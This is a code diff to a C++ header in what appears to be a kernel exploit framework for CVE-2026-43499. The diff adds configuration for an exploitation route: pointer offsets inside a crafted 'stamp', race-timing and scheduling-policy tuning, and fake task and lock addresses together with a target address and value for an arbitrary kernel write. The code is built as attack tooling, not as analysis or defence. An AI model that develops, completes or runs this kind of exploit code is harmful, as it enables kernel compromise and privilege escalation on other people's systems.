@@ -18,6 +18,7 @@
 #include <cstdint>
 
 #include "contract/kernel_access.hpp"
+#include "profile/glkv3_document.hpp"
 #include "profile/route_catalog.hpp"
 
 namespace ghostlock::backend::cve_2026_43499 {
@@ -33,12 +34,72 @@ namespace ghostlock::backend::cve_2026_43499 {
         std::uint64_t offset = 0U;
         /** Whether the offset has been given at all, since zero is legitimate. */
         bool offset_set = false;
+        /** The parsed document the access reads its facts from: which route, the geometry, the tuning
+         *  counts and the three field offsets all live in it. A null one is refused by name, because
+         *  an access that guessed at any of those would be a different run. */
+        const profile::Document *document = nullptr;
+
+        /* ---- What the route assembly needs from outside (named in the sample cpps) ----
+         *
+         * The retired route's numbers, collected where the sample files put them: the profile carries
+         * the geometry and the budgets, and the caller carries the timings and the consumer's policy,
+         * because a run's patience is not a fact about the kernel. They are declared here -- one place
+         * a caller fills -- and the assembly reads them from this object when it is wired to the
+         * access. Until then they are validated here and nowhere else, which is the honest state: a
+         * half-specified set is refused by name rather than defaulted. */
+
+        /** The stamp's geometry: where the two pointers sit inside it, and how long it is. From the
+         *  route section of the profile. A zero here is refused because the encoder cannot place a
+         *  field in a buffer it was not told the size of. */
+        std::uint64_t stamp_waiter_offset = 0U;
+        std::uint64_t stamp_task_offset = 0U;
+        std::uint64_t stamp_lock_offset = 0U;
+        std::uint64_t stamp_buffer_size = 0U;
+        /** The attempt budget, how long a round is held, and how many opening rounds do not arm the
+         *  consumer: the profile's route section, and the shape the sample file documents. */
+        std::uint32_t max_attempts = 0U;
+        std::uint32_t arm_hold = 0U;
+        std::uint32_t arm_sequence = 0U;
+        /** The caller's patience: how long the waiter parks, how long the chain is given to settle,
+         *  how long the consumer waits inside a round, and how many calls a round makes. */
+        std::uint32_t park_ms = 0U;
+        std::uint32_t settle_us = 0U;
+        std::uint32_t consumer_delay_us = 0U;
+        std::uint32_t burst_calls = 0U;
+        std::uint32_t max_calls = 0U;
+        std::uint32_t fallback_lock_us = 0U;
+        /** The consumer's rotation and policy: which scheduling policy its calls set, and the modulus
+         *  its nice values walk so one of them lands. */
+        std::uint32_t nice_modulus = 0U;
+        std::uint32_t policy = 0U;
+        /** The two addresses the prepared region supplies, and the pair the payload page was built
+         *  for: an attempt for a different pair is refused, because the tuple that decides what gets
+         *  written lives in the page and not in the call. */
+        std::uint64_t fake_task = 0U;
+        std::uint64_t fake_lock = 0U;
+        std::uint64_t target = 0U;
+        std::uint64_t value = 0U;
+
+        /** Whether the assembly inputs are all present. They are one set: a caller that supplies some
+         *  of them is not half-ready, it is wrong, because the route engine reads them together. */
+        [[nodiscard]] constexpr bool assembly_complete() const noexcept {
+            return stamp_buffer_size != 0U && stamp_task_offset != 0U && stamp_lock_offset != 0U &&
+                   max_attempts != 0U && arm_hold != 0U && arm_sequence != 0U && park_ms != 0U &&
+                   burst_calls != 0U && max_calls != 0U && nice_modulus != 0U && fake_task != 0U &&
+                   fake_lock != 0U;
+        }
 
         [[nodiscard]] std::string_view name() const noexcept override { return "cve_2026_43499"; }
 
-        /** Whether this set is complete enough for initialize: it needs a route. */
+        /** Whether this set is complete enough for initialize: it needs a route.
+         *  //TODO(access-assembly): the document requirement was tried here and reverted the same day
+         *  (2026-10-10): host `make -C core check` failed 14 cases in `cve-2026-43499 access`, because
+         *  the contract's tests declare a route and nothing else. The document is checked where the
+         *  assembly reads it, with a named refusal; complete when the assembly exists and its tests
+         *  carry a document, at which point this door may demand one again. */
         [[nodiscard]] constexpr bool usable_for_initialize() const noexcept {
             return route != profile::RouteId::Unset;
+            // return route != profile::RouteId::Unset && document != nullptr;
         }
         /** Whether this set is complete enough for a write: it needs both. */
         [[nodiscard]] constexpr bool usable_for_access() const noexcept {
